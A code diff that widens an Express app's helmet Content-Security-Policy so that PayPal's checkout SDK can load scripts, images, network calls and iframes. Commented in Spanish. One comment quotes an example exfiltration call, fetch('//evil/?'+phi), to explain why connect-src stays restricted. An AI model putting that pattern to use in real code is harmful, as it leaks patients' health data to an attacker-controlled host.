@@ -44,6 +44,14 @@ app.use(helmet({
         "https://cdn.quilljs.com",
         "https://cdn.jsdelivr.net",
         "https://unpkg.com",
+        // SDK de PayPal (pago de la suscripción sin salir de la app). Carga el
+        // script desde www.paypal.com y, por dentro, sus módulos desde
+        // paypalobjects + el antifraude desde c.paypal.com.
+        "https://www.paypal.com",
+        "https://www.sandbox.paypal.com",
+        "https://www.paypalobjects.com",
+        "https://c.paypal.com",
+        "https://c.sandbox.paypal.com",
       ],
       // helmet pone script-src-attr: 'none' por default (bloquearía onclick="…"),
       // la app actual depende mucho de event handlers inline → relajado a unsafe-inline.
@@ -73,18 +81,44 @@ app.use(helmet({
         "https://res.cloudinary.com",
         "https://*.tile.openstreetmap.org",
         "https://unpkg.com",
+        // Logos y píxeles de seguimiento del checkout de PayPal.
+        "https://www.paypal.com",
+        "https://www.sandbox.paypal.com",
+        "https://www.paypalobjects.com",
+        "https://t.paypal.com",
       ],
       // connect-src 'self' es la pieza clave: aunque un XSS sortee 'unsafe-inline',
       // no podrá exfiltrar datos via fetch('//evil/?'+phi) — el browser bloquea
       // cualquier destino que no sea el mismo origen.
-      connectSrc: ["'self'"],
+      // El SDK de PayPal habla con sus propios dominios desde el navegador
+      // (crear/aprobar la suscripción, telemetría y antifraude). Todo lo demás
+      // sigue restringido a 'self': un XSS no puede exfiltrar PHI a otro sitio.
+      connectSrc: [
+        "'self'",
+        "https://www.paypal.com",
+        "https://www.sandbox.paypal.com",
+        "https://api-m.paypal.com",
+        "https://api-m.sandbox.paypal.com",
+        "https://c.paypal.com",
+        "https://c.sandbox.paypal.com",
+      ],
       // 'self' (no 'none') porque consultation-orthodontics.html embebe
       // /ortodoncia-design/index.html en un iframe same-origin. Sigue
       // bloqueando que terceros embeban la app → defensa de clickjacking.
       frameAncestors: ["'self'"],
       // Qué iframes puede embeber NUESTRA app. Sin esto, las landings de las
       // clínicas no podrían mostrar el mapa de Google Maps en /c/<slug>.
-      frameSrc: ["'self'", "https://www.google.com", "https://maps.google.com"],
+      // El checkout de PayPal se pinta en iframes propios superpuestos a la
+      // página (por eso el pago no saca al usuario de la app).
+      frameSrc: [
+        "'self'",
+        "https://www.google.com",
+        "https://maps.google.com",
+        "https://www.paypal.com",
+        "https://www.sandbox.paypal.com",
+        "https://c.paypal.com",
+        "https://c.sandbox.paypal.com",
+      ],
       objectSrc: ["'none'"],
       baseUri: ["'self'"],
       formAction: ["'self'"],
